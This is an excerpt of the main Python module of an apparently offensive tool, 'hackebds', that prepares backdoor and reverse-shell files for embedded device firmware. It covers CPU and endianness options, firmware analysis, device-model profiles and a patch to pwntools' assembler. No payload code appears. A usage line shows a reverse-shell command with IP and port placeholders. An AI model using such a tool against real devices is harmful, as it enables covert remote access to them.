import sys
_saved_argv = sys.argv.copy()  # 保存原始参数，防止 pwntools 消费全大写参数

from . import extract_shellcode
from pwn import *
import argparse

sys.argv = _saved_argv  # 恢复参数（在所有 pwntools 导入后）
...
from . import mips32n
from . import firmware_analyzer
from . import mcpu_config

chars = string.ascii_letters

# Global variable for mcpu setting
_global_mcpu = None
_original_assembler = None
_asm_patched = False

def set_mcpu(mcpu_value):
    """Set the global mcpu value for assembly generation."""
    global _global_mcpu
    _global_mcpu = mcpu_value
    if mcpu_value:
        _patch_pwntools_asm()

def get_mcpu():
    """Get the current mcpu value."""
    return _global_mcpu

def _get_mcpu_asm_flags():
    """Get assembler flags for mcpu based on current architecture."""
    mcpu = get_mcpu()
    if not mcpu:
        return []
    ...
    # Use mcpu_config to get proper flags if valid
    arch_info = mcpu_config.get_arch_from_mcpu(mcpu)
    if arch_info:
        # For ARM, use both -march and -mcpu for accurate code generation
        if arch_info.get('arch_type') == 'arm':
            if arch_info.get('march_flag'):
                flags.append(arch_info['march_flag'])
            if arch_info.get('mcpu_flag'):
                flags.append(arch_info['mcpu_flag'])
        else:
            # For other architectures, use march_flag or mcpu_flag
            if arch_info.get('march_flag'):
                flags.append(arch_info['march_flag'])
            elif arch_info.get('mcpu_flag'):
                flags.append(arch_info['mcpu_flag'])
        return flags

    # Fallback for mcpu values not in config
    if arch in ['arm']:
        flags.append('-mcpu=' + mcpu)
    elif arch in ['aarch64']:
        flags.append('-mcpu=' + mcpu)
    elif arch in ['mips', 'mips64']:
        # MIPS: -march=mips32r2 format
        if mcpu.startswith('mips'):
            flags.append('-march=' + mcpu)
        else:
            flags.append('-march=mips' + mcpu)
    elif arch in ['powerpc', 'powerpc64']:
        flags.append('-mcpu=' + mcpu)
    elif arch in ['i386', 'amd64']:
        flags.append('-march=' + mcpu)

    return flags

def _patch_pwntools_asm():
    """
    Patch pwntools _assembler function to add mcpu flags.
    _assembler() returns the assembler command list like ['/path/to/as', '-32']
    We patch it to append mcpu flags.
    """
    global _original_assembler, _asm_patched
    ...
    try:
        ...
        # Save original _assembler function
        if _original_assembler is None:
            _original_assembler = pwnlib.asm._assembler

        def patched_assembler():
            """Patched _assembler that adds mcpu flags to assembler command."""
            cmd = list(_original_assembler())  # Get original command

            # Add mcpu flags based on current context.arch
            mcpu_flags = _get_mcpu_asm_flags()
            if mcpu_flags:
                cmd.extend(mcpu_flags)
                log.debug(f"Assembler command with mcpu: {cmd}")

            return cmd

        # Patch it
        pwnlib.asm._assembler = patched_assembler
        _asm_patched = True
        log.info(f"Assembler patched with mcpu={get_mcpu()}")

    except Exception as e:
        log.warning(f"Failed to patch pwntools asm: {e}")

def asm_with_mcpu(code, **kwargs):
    """
    Wrapper for pwntools asm() that ensures mcpu patch is applied.
    """
    if get_mcpu() and not _asm_patched:
        _patch_pwntools_asm()
    return asm(code, **kwargs)
...
def get_version():
    return Fore.GREEN+"Version: "+__version__+Fore.RESET
...
def main():
	...
	parser.add_argument('-mcpu', '--mcpu', required=False, type=str, default=None,
		help='Specify CPU type for assembly. Use --mcpu-list to see all options. '
		     'Examples: mips32r2, cortex-a7, arm926ej-s')
	parser.add_argument('-li', '--little-endian', action='store_true', dest='little_endian',
		help='Little-endian mode (use with -mcpu for MIPS/ARM)')
	parser.add_argument('-bi', '--big-endian', action='store_true', dest='big_endian',
		help='Big-endian mode (use with -mcpu for MIPS/ARM)')
	parser.add_argument('--mcpu-list', action='store_true', dest='mcpu_list',
		help='List all supported -mcpu options for MIPS, ARM, and AArch64')
	parser.add_argument('--firmware', '-fw', required=False, type=str, default=None,
		help='Analyze firmware file: show uboot, kernel, filesystem, architecture info')
	flag_cve_info = 0
	#@with_argparser(argparse)
	args = parser.parse_args()

	# Handle --mcpu-list option (print and exit)
	if args.mcpu_list:
		mcpu_config.print_all_mcpu_options()
		print(mcpu_config.get_mcpu_help_text())
		return
	...
	database.init_db()
	# Load or initialize device data
	model_choise.data_base_init()
	log.success("Initialization completed")

	# Handle firmware analysis first (displays info and optionally sets arch)
	if args.firmware:
		if not os.path.exists(args.firmware):
			log.error(f"Firmware file not found: {args.firmware}")
			return
		fw_result = firmware_analyzer.analyze_firmware(args.firmware)
		if fw_result:
			# If user wants to generate backdoor, set arch from firmware
			if args.res:
				args.arch = fw_result.get('arch')
				if not args.mcpu and fw_result.get('mcpu'):
					args.mcpu = fw_result.get('mcpu')
				log.success(f"Auto-detected: arch={args.arch}, mcpu={args.mcpu}")
		# If only analyzing firmware (no -res), just return after display
		if not args.res:
			return

	# Handle -mcpu with -li/-bi (endianness) to auto-determine architecture
	if args.mcpu and (args.little_endian or args.big_endian):
		# Validate endianness options
		if args.little_endian and args.big_endian:
			log.error("Cannot specify both -li and -bi. Choose one endianness.")
			return

		# Get architecture info from mcpu
		arch_info = mcpu_config.get_arch_from_mcpu(args.mcpu)
		if not arch_info:
			log.error(f"Unknown -mcpu value: {args.mcpu}")
			log.info("Use --mcpu-list to see all supported options")
			return
		...
		# Check for unsupported architectures (e.g., very old ARM like arm1, arm2)
		if not arch_info.get('supported', True):
			log.error(f"Unsupported CPU: {args.mcpu}")
			if arch_info.get('warning'):
				log.error(arch_info['warning'])
			log.info("Please use a supported -mcpu value. Use --mcpu-list to see options.")
			log.info("For ARM, minimum supported is armv5 (e.g., arm7tdmi, arm926ej-s)")
			return

		# Show warning if there's one but architecture is still supported
		if arch_info.get('warning'):
			log.warning(arch_info['warning'])

		# Map to hackebds arch name based on arch_type, bits, endian
		if arch_type == 'mips':
			if bits == 64:
				args.arch = 'mips64el' if endian == 'little' else 'mips64'
			else:
				args.arch = 'mipsel' if endian == 'little' else 'mips'
		elif arch_type == 'arm':
			# Use arch_suffix from mcpu_config for accurate arch selection
			arch_suffix = arch_info.get('arch_suffix', 'v7')
			if endian == 'little':
				args.arch = f'armel{arch_suffix}'
			else:
				args.arch = f'armeb{arch_suffix}'
		elif arch_type == 'aarch64':
			# AArch64 is typically little-endian
			if endian == 'big':
				log.warning("AArch64 big-endian is rare, using little-endian")
			args.arch = 'aarch64'
		else:
			log.error(f"Unsupported architecture type: {arch_type}")
			return

		march_info = arch_info.get('march', args.mcpu)
		log.success(f"Auto-detected from -mcpu {args.mcpu}: arch={args.arch} (march={march_info})")

	# Handle mcpu option - must patch asm before any shellcode generation
	if args.mcpu:
		# Validate mcpu value
		if not mcpu_config.is_valid_mcpu(args.mcpu):
			log.warning(f"-mcpu '{args.mcpu}' not in known list, using as-is")
		set_mcpu(args.mcpu)
		log.success(f"MCPU set to: {args.mcpu}"
		            f" (will use -march/-mcpu flags for assembler)")
	...
	if(args.arch != None and args.model != None):
		flag_cve_info = 1
		# Save complete model profile with arch, mcpu, and endianness
		endian_str = None
		...
		# Save the model profile to database
		database.save_model_profile(args.model, args.arch, args.mcpu, endian_str)
		log.success("Saved model profile: {} -> arch={}, mcpu={}, endian={}".format(
			args.model, args.arch, args.mcpu or 'default', endian_str or 'default'))

		# Also update the legacy arch cache for backward compatibility
		try:
			...
			log.info("Please make sure arch is set correctly")
	...
	if (args.model != None and args.arch==None):
		try:
			flag_cve_info = 1
			# First try to load complete model profile
			profile = database.get_model_profile(args.model)
			if profile:
				args.arch = profile['arch']
				# Load mcpu if stored and not already set
				if profile.get('mcpu') and not args.mcpu:
					args.mcpu = profile['mcpu']
					set_mcpu(args.mcpu)
					log.success(f"Loaded mcpu from profile: {args.mcpu}")
				# Load endianness if stored and not already set
				if profile.get('endianness') and not args.little_endian and not args.big_endian:
					if profile['endianness'] == 'little':
						args.little_endian = True
					elif profile['endianness'] == 'big':
						args.big_endian = True
					log.success(f"Loaded endianness from profile: {profile['endianness']}")
				log.success("Loaded model profile: {} -> arch={}, mcpu={}, endian={}".format(
					args.model, args.arch, profile.get('mcpu') or 'default', profile.get('endianness') or 'default'))
			else:
				# Fall back to legacy arch-only lookup
			...
			log.info("Example: hackebds -model {} -arch mipsel -mcpu mips32r2 -li -reverse_ip <IP> -reverse_port <PORT> -res reverse_shell_file".format(args.model))
			return
